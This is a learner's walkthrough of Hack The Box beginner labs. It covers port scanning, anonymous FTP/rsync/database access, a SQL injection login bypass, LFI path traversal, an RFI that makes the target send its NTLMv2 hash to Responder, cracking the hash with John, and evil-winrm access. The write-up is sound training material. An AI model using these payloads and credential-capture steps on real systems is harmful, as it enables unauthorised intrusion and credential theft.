# Hack The Box: Basics of Penetration Testing Tier 0 & 1 

**Summary of Modules:**

In completing these tasks I’ve gained foundational skills in network scanning, service enumeration, and identifying web application vulnerabilities. I learned how to exploit network protocols, capture authentication hashes, and understood the significance of securing internal services like LLMNR and SMB. Through various modules, I practiced using tools like Nmap for port scanning, Responder for network attacks, and gained hands-on experience with rsync for file transfer and enumeration. I explored web vulnerability techniques, such as brute-forcing login pages and locating hidden files or directories that could expose sensitive information. Overall, these exercises helped me understand core penetration testing concepts and the importance of proper configuration and security in network and web environments.

# Tier 0

**Redeemer**

<ins>Summary:<ins>

* This lab focuses on enumerating a Redis server remotely and then dumping its database in order to retrieve the flag.

* Redis - Remote Dictionary Server -  Interacted with Redis server.

<ins>Commands:<ins>

* `ping`
* `nmap -p- -sV` - This command runs an Nmap scan that probes all 65,535 TCP ports (-p-) and attempts to detect the version of services running on open ports (-sV).
* `sudo apt install redis-tools` - Downloading redis CLI

**Explosion**

<ins>Summary:<ins>

* CLI and GUI remote access tools like `xfreerdp`

* xfreedrp output adjustment

<ins>Commands:<ins>

* `sudo nmap -sV [target IP]`
* `xfreerdp /v:[target IP] /cert:ignore /u:Administrator`

**Preignition**

<ins>Summary:<ins>

* WordPress setup and IOC (Indicators of Compromise)
* dir busting is the name used for directory brute forcing
* Using gobuster 

<ins>Commands:<ins>

* `sudo apt install golang-go` - this installs go
* `sudo apt install gobuster` - installs gobuster
* gobuster commands: `dir`, `-w` (specify a wordlist), `-u`(target IP)
  
![1](https://github.com/user-attachments/assets/1f1284e7-cec4-45f0-ab60-1f1c9f92aa8d)

![1](https://github.com/user-attachments/assets/bf2fe490-f86c-49b6-bf90-25f020a113b1)

**Monogod**

<ins>Summary:<ins>

Run a complete TCP port scan using sudo nmap -p- -sV [target IP] to identify open ports and their associated services on the target machine, revealing MongoDB on port 27017.

MongoDB is a NoSQL database, and to access it, use the Mongo shell (mongosh) to connect and list databases with show dbs; use show collections to view collections in a database and db.flag.find().pretty() to display documents in the flag collection in a readable format.

<ins>Taks:<ins>

How many TCP ports are open on the machine?

1. `ping [target IP` - Confirms target is reachable.
2. `sudo nmap -p- -sV [target IP]` - This searches all TCP ports and the version of services running on open ports.

![1](https://github.com/user-attachments/assets/81d2f888-9828-459a-a392-57693ef83da9)

Which service is running on port 27017 of the remote host?

![1](https://github.com/user-attachments/assets/202472d6-a192-4406-a90c-9de7912e9207)

What type of database is MongoDB? (Choose: SQL or NoSQL)

NoSQL

What is the command name for the Mongo shell that is installed with the mongodb-clients package?

mongosh

What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing.

1. To interact with MongoDB server 1st I install MongoDB shell utillity.

* `curl -O https://downloads.mongodb.com/compass/mongosh-2.3.2-linux-x64.tgz`

2. Extract contents using `tar` utility

* `tar xvf mongosh-2.3.2-linux-x64.tgz`

3. Locate mongosh binary (mongosh-2.3.2-linux-x64/bin)

![1](https://github.com/user-attachments/assets/a2101fcf-5185-49d9-b3ae-458220e7d218)

4. Change directory into that binary.

* `cd mongosh-2.3.2-linux-x64/bin`

5. Connect to the MongoDB sever.

* ./mongosh mongodb://{target_IP}:27017

![1](https://github.com/user-attachments/assets/05069cc8-6a2c-4730-a27e-b73b2a975963)

Answer: show dbs (list databases present)

What is the command used for listing out the collections in a database?

show collections

What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

db.flag.find().pretty()

This code queries all documents in the flag collection of the db database and formats the output in a readable (pretty-printed) JSON format.

![1](https://github.com/user-attachments/assets/3c3057dc-d120-4302-a999-804473e46e77)

**Synced**

<ins>Summary:<ins>

* In this Hack The Box walkthrough, an Nmap scan is used to detect an open rsync service on port 873 of the target machine. By connecting to the rsync server as an anonymous user and syncing files from the "public" directory, the user retrieves a flag.txt file, demonstrating the utility of rsync for file transfer and synchronization between systems.

* This exercise highlights the fundamentals of enumerating services and leveraging file-sharing protocols like rsync for ethical hacking, setting a solid foundation for further cybersecurity learning.

<ins>Taks:<ins>

What is the default port for rsync?

* 873

How many TCP ports are open on the remote host?

* `nmap -p- --min-rate=1000 -sV [target IP]` - adding the (--min-rate=1000) this speeds up the scan, higher the number the faster the scan

What is the protocol version used by rsync on the remote machine?

![1](https://github.com/user-attachments/assets/03899578-3914-4666-8023-07c41f38cf87)

What is the option to only list shares and files on rsync? (No need to include the leading -- characters)

* `list-only` - full code: rsync --list-only [target IP]

![1](https://github.com/user-attachments/assets/89fa8853-8a83-417a-9852-6f00f643fbb5)

* I will take a look inside the public share, in the hopes to find the flag, to do this, use this command:

* `rsync --list-only {target_IP}::public`

* last step is to copy/sync this file to our local machine. To do that, we simply follow the general syntax by specifying the SRC as public/flag.txt and the DEST as flag.txt to transfer the file to our local machine.

* rsync {target_IP}::public/flag.txt flag.txt

Now I have the flag file saved to my machine, to finish just `cat` the flag.txt file.

# Tier 1

**Appointment**

<ins>Summary:<ins>

*  Learn to identify vulnerabilities in web applications by scanning for open ports and exploring HTTP services. They practice exploiting outdated software and uncovering sensitive information in poorly configured applications, emphasizing the importance of version management and secure configurations. This module helps develop skills in basic web exploitation and introduces fundamental concepts in recognizing common web security flaws.

<ins>Taks:<ins>

What does Nmap report as the service and version that are running on port 80 of the target?

* `sudo nmap -sC -sV` - sC is new, this performs a script scan using the default set of scripts. It is equivalent to -script=default. Some of the scripts in this category are considered intrusive and should not be run against a target network without permission.

![1](https://github.com/user-attachments/assets/cad95fcf-ce02-4ef9-95cc-011b5f385147)

* We will be attempting to perform a SQL injection attack, first go to the target IP in the broswer.

![1](https://github.com/user-attachments/assets/d183d630-1ea2-4090-b8ce-dc76fdea5f15)

For the username use: `admin'#` , this command = `SELECT * FROM users WHERE username = 'admin'#' AND password = 'some';`

For password use: anything the password is bypassed.

![1](https://github.com/user-attachments/assets/66849b83-88cb-4af2-9306-46cd1b0c247f)

![2](https://github.com/user-attachments/assets/1c043299-5461-4ca8-8a54-4bf8d85503e2)


**Sequel**

<ins>Summary:<ins>

*  Explore directory enumeration techniques to locate hidden files or pages that may contain sensitive information. This module reinforces the importance of secure authentication methods and demonstrates the risks of exposed directories in web applications.

<ins>Taks:<ins>

During our scan, which port do we find serving MySQL?

![1](https://github.com/user-attachments/assets/9243119a-f913-43cb-b410-03e85002f777)

What community-developed MySQL version is the target running?

* After finding mySQL running, to check the version use: `mysql --help`

* This shows I can use the `-V` command with mysql to get the version

![1](https://github.com/user-attachments/assets/ca4205f9-2bdf-41bb-9c3d-a87a9b6a5b66)

When using the MySQL command line client, what switch do we need to use in order to specify a login username?

* In the `mysql --help` you can aslo see the `-u` is used for login if not current user.

![1](https://github.com/user-attachments/assets/4e53457d-6327-445e-99ee-628271685837)

* Command: mysql -h [taget IP] -u root (This command (`-h`) is connecting us to that host, (`-u`) is the username used to try to connect with.

![1](https://github.com/user-attachments/assets/7006bb21-55ac-45ab-96cf-25d0d02de466)

MySQL Commands:

* For MySQL commands they end with `;`
* `SHOW databases;` : Prints out the databases we can access.
* `USE [database name];` : Set to use the database named [database_name].
* `SHOW tables;` :  Prints out the available tables inside the current database.
* `SELECT * FROM [table_name];` : Prints out all the data from the table {table_name}.

There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

* First to show the databases: `SHOW databases;`

![1](https://github.com/user-attachments/assets/f08de30d-d138-4ff3-a5fe-6d496d81e2b5)

Submit root flag.

* To show flag, use the `USE [htb];`

![1](https://github.com/user-attachments/assets/c84f4695-8aa9-4797-a48d-d6249ab0fdb3)

* Now useing the htb database to see the tables inside use: `SHOW tables;`

* Check the config and user tables to find flag with: `SELECT * FROM [table_name];`

![1](https://github.com/user-attachments/assets/7c304e2a-74af-49a3-bd63-273512d0c350)

**Crocodile**

<ins>Summary:<ins>

<ins>Taks:<ins>

What service version is found to be running on port 21?

* use: `sudo nmap -sC -sV [Target IP]

![1](https://github.com/user-attachments/assets/9daa1b8c-1d7f-4b6a-a060-e93838b710d9)

What FTP code is returned to us for the "Anonymous FTP login allowed" message?

![1](https://github.com/user-attachments/assets/255e544b-f289-4434-a484-774771bcbd5f)

After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

* First to connect to the FTP client use: `ftp [target IP]

* Users could connect to the FTP server anonymously if the server is configured to allow it, meaning that we could use it even if we had no valid credentials. If we look back at our nmap scan result, the FTP server is indeed configured to allow anonymous login:

* Once connected use "anonymous" as the password to connect.

After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

* Use the `dir` command to list directories.

![1](https://github.com/user-attachments/assets/cd6a04bb-e2f6-45b6-bc94-5ce39224f708)

* Use `get` command to download files.

* Use `exit` to leave ftp server.

* Use `ls` to see if files were downloaded succesfully.

![1](https://github.com/user-attachments/assets/4da9c7b5-f4ed-4c2b-9aad-6a97b580f93d)

What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

* `cat allowed.userlist`

![1](https://github.com/user-attachments/assets/f5945598-a87f-45bd-8658-cffba61eb66a)

What version of Apache HTTP Server is running on the target host?

* `sudo nmap -sV [Target IP]

![1](https://github.com/user-attachments/assets/584155e4-1f9e-4521-9e97-011aef49d5e2)

**Repsonder**

<ins>Summary:<ins>

* I learned how to exploit network protocols to capture and analyze authentication hashes on a local network using a tool called Responder. This module showed me how vulnerabilities in services like LLMNR and SMB can expose credentials, allowing attackers to intercept them and perform offline brute-force attacks. Through this exercise, I gained a better understanding of network-based attacks and saw firsthand why securing internal network protocols is essential to prevent credential interception.

<ins>Taks:<ins>

When visiting the web service using the IP address, what is the domain that we are being redirected to?

* `sudo nmap -p- --min-rate 1000 -sV [target IP]`

* Now I will need to maually resolve the Domain name to the target IP. To do this editting the `/etc/hosts` is needed.

* To edit the file use: `sudo nano /etc/hosts`

* Then add the target IP and the domain

![1](https://github.com/user-attachments/assets/ce20f326-1cca-4119-a441-d1cc49ba197e)

* Now the domain is reachable

What is the name of the URL parameter which is used to load different language versions of the webpage?

* To find the URL parameter look in the search bar, after changing the webistes language and at the end you will see "page=" This is the URL parameter.

* While page is a common example of a URL parameter used to load different versions of a webpage, there are many other types of URL parameters that serve different functions.

* These parameters help create dynamic, user-friendly websites that respond to user input.

* Noticing the URL, we can see that the french.html page is being loaded by the page parameter, which may potentially be vulnerable to a Local File Inclusion (LFI) vulnerability if the page input is not sanitized. 

*  Local File Inclusion occurs when an attacker is able to get a website to include a file that was not intended to be an option for this application.

*  To view all the most common types of LFI use this repositroy: https://github.com/Brad14t/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

*  To try and traverse the target IP ill use: http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts

![1](https://github.com/user-attachments/assets/509e6aa6-d208-4352-ba75-4f78a16d268e)

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

* RFI is a vulnerability that occurs when a web application allows external files to be included in its codebase. This is usually due to improper input validation, allowing attackers to inject a remote file, such as a script, into the application.

* //10.10.14.6/somefile

What does NTLM stand for?

* New Technology LAN Manager

* NTLM is a suite of security protocols developed by Microsoft to authenticate users and computers in a network environment.

Which flag do we use in the Responder utility to specify the network interface?

* Responder is a versatile tool that listens for various network protocol requests and captures authentication hashes.

* To find out how to use Responder try: responder -h

![1](https://github.com/user-attachments/assets/a6719fd0-fbe6-4271-ab29-8214e4323968)

Before running responder, find your newtork interface by using: `ip a | grep [Target IP]` or `ip a` or `ifconfig`

![2](https://github.com/user-attachments/assets/89a84fcc-7830-4073-8dd5-98c65160db5f)

Now that responder is running use, we need to capture the hash from the RFI exploit. Input into your url: http://unika.htb/index.php?page=//<your_ip_address>/Sharefilehtb

* Change the url to your IP, then we can seeresponder got something when interacting with the URL.

![1](https://github.com/user-attachments/assets/d92c7b9b-fc31-4f0d-a1b1-83fc6b53d9e5)

* We will be using John the ripper as a password cracker. It is an open-source password cracking tool, commonly referred to as “John.” Its primary purpose is to crack password hashes using dictionary attacks, brute force, or various other methods. 

* Now we have the NTLMv2 hash, we need to save it. Use: `echo [insert hash] > hash`

![1](https://github.com/user-attachments/assets/028a9594-52ea-4363-bb7d-97da358db715)

* Next is I need a Worldlist (rockyou.txt), this is just a list of popular passwords. Parrot comes with the list, it just needs to be unzipped. Change directory to: `cd /usr/share/wordlists`

![1](https://github.com/user-attachments/assets/8e0a33d9-78da-47c0-80c2-37352c90e13f)

* To unzip: `sudo gunzip rockyou.txt.gz`

* Once the hash file and wordlist is ready, you can start the cracking with: `sudo john --wordlist="rockyou.txt" hash`

* After cracking the has, john give me the password = "badminton"

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

![1](https://github.com/user-attachments/assets/e633c4b3-1410-4a3e-aaa0-e15f6d943b18)

* For the answer I need to use Evil-WinRM to establish remote access to the target system using WinRM (Windows Remote Management).

* Now to try to coonect to target using the username and password found, using evil-winrm: `sudo evil-winrm -u Administrator -p badminton -i <target_ip_address>`

* Powershell commmand to find flag: `Get-Childitem -Path c:\ -Recurse -Filter "flag*"`

* `cat flag.txt` for answer.















